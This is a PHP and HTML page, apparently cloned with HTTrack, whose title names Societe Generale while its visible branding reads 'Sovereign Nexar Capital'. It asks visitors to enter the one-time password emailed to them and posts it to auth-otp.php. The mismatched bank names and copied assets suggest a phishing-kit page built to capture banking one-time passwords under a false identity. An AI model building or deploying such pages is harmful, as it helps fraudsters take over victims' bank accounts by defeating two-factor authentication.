
<?php
ini_set('display_errors',0);
session_start();

?>
<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta charset="utf-8" />
	<title>Societe Generale | OTP</title>
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
	<meta content="" name="description" />
	<meta content="" name="author" />
	<link rel="shortcut icon" href="./img/trust-icon.png" type="image/png">
	<!-- ================== BEGIN BASE CSS STYLE ================== -->
	<link href="assets/plugins/jquery-ui/themes/base/minified/jquery-ui.min.css" rel="stylesheet" />
	<link href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
	<link href="assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
	<link rel="stylesheet" href="../../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href="assets/css/animate.min.css" rel="stylesheet" />
	<link href="assets/css/style.min.css" rel="stylesheet" />
	<!-- ================== END BASE CSS STYLE ================== -->
	
	<!-- ================== BEGIN BASE JS ================== -->
	<script src="assets/plugins/loader/pace/pace.min.js"></script>
	<!-- ================== END BASE JS ================== -->
</head>
<body class="inverse-mode" style="background-image: url(img/walll.jpg); background-size:cover; background-attachment:fixed;">
	<!-- BEGIN #page-container -->
	<div id="page-container">
		<!-- BEGIN login -->
        <a href="https://#?id=im/"><div class="login"><img src="../assets/img/logo-blackK.png" width="200" style="padding: 10px 10px; ">
		<b style="font-size:2.0em; color:#fff;"></b>
			<!-- BEGIN login-cover -->
			<div class="login-cover"></div>
			<!-- END login-cover -->
			<!-- BEGIN login-content -->
			<div class="login-content">
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
						 				<!-- BEGIN login-brand -->
				<div class="login-brand">
					<a href="#"><span class=" fa fa-lock logo"></i></span> Sovereign Nexar Capital</a>
				</div>
				<!-- END login-brand -->
				<!-- BEGIN login-desc -->
				<div class="login-desc">
					Enter the OTP sent to your email
				</div>
				<!-- END login-desc -->
				<!-- BEGIN login-form -->
				<form method="POST" action="auth-otp.php">
                <?php
				if($error){?>              
						                
						<div style="color: yellow; font-weight:bold; margin:15px 0px 15px 0px;"><?php echo $error; ?></div>
				                    
				                <?php } ?>

				    <div class="form-group">
						<label class="control-label">Enter OTP</label>
						<input type="password" name="otp" class="form-control" value="" />
					</div>
					
					
					<button type="submit" name="login" class="btn btn-inverse">Continue to Account</button>
                    <br><br><a href="javascript:history.back()"><strong>[ Go Back ]</strong></a>
                
                </form>
				<!-- END login-form --><br><br><br><br><br><br><br><br><br><br><br>
				<footer class="">
		&copy; <?php echo date('Y'); ?> Sovereign Nexar Capital Savings. All Rights Reserved.
			
		</footer>
			</div>
			<!-- END login-content -->
        </div>
        <!-- END login -->
		
		<!-- BEGIN btn-scroll-top -->
		<a href="#" data-click="scroll-top" class="btn-scroll-top fade"><i class="ti-arrow-up"></i></a>
		<!-- END btn-scroll-top -->
		
	</div>
	<!-- END #page-container -->
	
	<!-- ================== BEGIN BASE JS ================== -->
	<script src="assets/plugins/jquery/jquery-1.9.1.min.js"></script>
	<script src="assets/plugins/jquery/jquery-migrate-1.1.0.min.js"></script>
	<script src="assets/plugins/jquery-ui/ui/minified/jquery-ui.min.js"></script>
	<script src="assets/plugins/cookie/js/js.cookie.js"></script>
	<script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="assets/plugins/scrollbar/slimscroll/jquery.slimscroll.min.js"></script>
	<!-- ================== END BASE JS ================== -->
	
	<!-- ================== BEGIN PAGE LEVEL JS ================== -->
	<script src="assets/js/apps.min.js"></script>
	<!-- ================== END PAGE LEVEL JS ================== -->
	
	<script>
		$(document).ready(function() {
			App.init();
		});
	</script>

</body>

</html>